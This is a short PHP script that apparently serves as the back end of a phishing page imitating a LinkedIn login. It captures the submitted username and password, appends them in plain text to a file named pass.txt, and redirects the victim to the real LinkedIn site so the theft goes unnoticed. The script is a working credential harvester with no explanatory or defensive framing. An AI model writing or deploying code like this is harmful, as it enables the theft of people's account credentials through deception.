<?php
    $username = $_POST["username"];
    $pass = $_POST["password"];

    $handle = fopen("pass.txt", "a");
    fwrite($handle, $username . ", " . $pass . "\n");
    fclose($handle);

    header ("Location: https://www.linkedin.com");

    exit;
?>
